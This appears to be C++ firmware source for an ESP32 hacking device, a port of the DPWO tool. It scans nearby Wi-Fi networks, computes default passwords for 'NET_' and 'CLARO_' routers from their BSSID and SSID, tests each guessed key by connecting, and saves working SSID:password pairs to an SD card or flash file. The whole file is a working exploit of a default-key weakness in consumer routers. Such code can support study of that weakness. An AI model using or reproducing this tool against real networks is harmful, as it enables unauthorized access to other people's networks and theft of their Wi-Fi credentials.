/*
  Port of DPWO for ESP32 by pr3y

  Originally from https://github.com/caioluders/DPWO

  saves login creds on SD mounted card
*/
#include <WiFi.h>
#include <regex>

#define SD_CREDS_PATH "/dpwo_creds.txt"

#include "core/globals.h"
#include "core/sd_functions.h"
#include "dpwo.h"

int ap_scanned = 0;

void parse_BSSID(char* bssid_without_colon, const char* bssid) {
  int j = 0;
  for (int i = 0; i < strlen(bssid); ++i) {
    if (bssid[i] != ':') {
      bssid_without_colon[j++] = bssid[i];
    }
  }
  bssid_without_colon[j] = '\0';
}

void net_ap(int i) {
  char bssid_without_colon[18];
  parse_BSSID(bssid_without_colon, WiFi.BSSIDstr(i).c_str());
  Serial.println("MAC addr");
  Serial.println(bssid_without_colon);

  char *bssid_ready = bssid_without_colon + 4;
  bssid_ready[strlen(bssid_ready)-2] = '\0';
  int ssid_length = WiFi.SSID(i).length();
  if (ssid_length >= 2) {
      String last_two = WiFi.SSID(i).substring(ssid_length - 2);
      strcat(bssid_ready, last_two.c_str());
  } else {
      Serial.println("ERROR");
  }
  WiFi.begin(WiFi.SSID(i).c_str(), bssid_ready);
  // TODO: Dont depend on delays and compare the wifi status other way :P
  delay(2000);
  while (WiFi.status() != WL_CONNECTED) {
    Serial.println("\nNOPE");
    WiFi.disconnect();
    return;
  }
  Serial.println("\nWiFi Connected");
  WiFi.disconnect();

  FS *Fs;
  File file;
  if(setupSdCard()) Fs = &SD;
  else {
    if(checkLittleFsSize()) Fs = &LittleFS;
    else goto PrintOnly;
  }
  file = (*Fs).open(SD_CREDS_PATH,FILE_APPEND,true);
  file.println(String(WiFi.SSID(i) + ":" + bssid_ready).c_str());
  Serial.println("\nWrote creds to SD");
  file.close();

  PrintOnly:
  tft.setTextSize(1);
  tft.setTextColor(bruceConfig.secColor);
  tft.println(String(WiFi.SSID(i) + ":" + bssid_ready).c_str());
}

void claro_ap(int i) {
  char bssid_without_colon[18];
  parse_BSSID(bssid_without_colon, WiFi.BSSIDstr(i).c_str());
  Serial.println("MAC addr");
  Serial.println(bssid_without_colon);

  char *bssid_ready = bssid_without_colon + 4;
  bssid_ready[strlen(bssid_ready)-2] = '\0';
  int ssid_length = WiFi.SSID(i).length();
  WiFi.begin(WiFi.SSID(i).c_str(), bssid_ready);
  delay(2000);
  while (WiFi.status() != WL_CONNECTED) {
    Serial.println("\nNOPE");
    WiFi.disconnect();
    return;
  }
  Serial.println("\nWiFi Connected");
  WiFi.disconnect();

  FS *Fs;
  File file;
  if(setupSdCard()) Fs = &SD;
  else {
    if(checkLittleFsSize()) Fs = &LittleFS;
    else goto PrintOnly;
  }
  file = (*Fs).open(SD_CREDS_PATH,FILE_APPEND,true);
  file.println(String(WiFi.SSID(i) + ":" + bssid_ready).c_str());
  Serial.println("\nWrote creds to SD");
  file.close();

  PrintOnly:
  tft.setTextSize(1);
  tft.setTextColor(bruceConfig.secColor);
  tft.println(String(WiFi.SSID(i) + ":" + bssid_ready).c_str());
}


void dpwo_setup() {
  // tft.clear();
  tft.fillScreen(bruceConfig.bgColor);
  tft.setCursor(0, 0);
  Serial.println("Scanning for DPWO...");
  WiFi.mode(WIFI_STA);
  ap_scanned = WiFi.scanNetworks();
  Serial.println(ap_scanned);

  tft.setTextColor(bruceConfig.secColor);
  tft.println("Scanning for DPWO...");

  if (ap_scanned == 0) {
    tft.println("no networks found");
  } else {

    //TODO: add different functions to match Copel and Vivo regex on SSID also
    std::regex net_regex("NET_.*");
    std::regex claro_regex("CLARO_.*");


    //TODO: dont repeat the wifi connection process inside each function, instead work on this loop

    for (int i = 0; i < ap_scanned; ++i) {
      if (std::regex_search(WiFi.SSID(i).c_str(), net_regex)) {
        net_ap(i);
        Serial.println("NET SSID");
      } else if (std::regex_search(WiFi.SSID(i).c_str(), claro_regex)) {
        claro_ap(i);
        Serial.println(WiFi.SSID(i));
        Serial.println("CLARO SSID");

      } else {
        Serial.println("not vuln");
        Serial.println(WiFi.SSID(i));

      }


    }


  }
  Serial.println("scanning again");
  ap_scanned = WiFi.scanNetworks();

  //TODO: append vulnerable APs and dont repeat the output inside a loop
  tft.fillScreen(bruceConfig.bgColor);

}
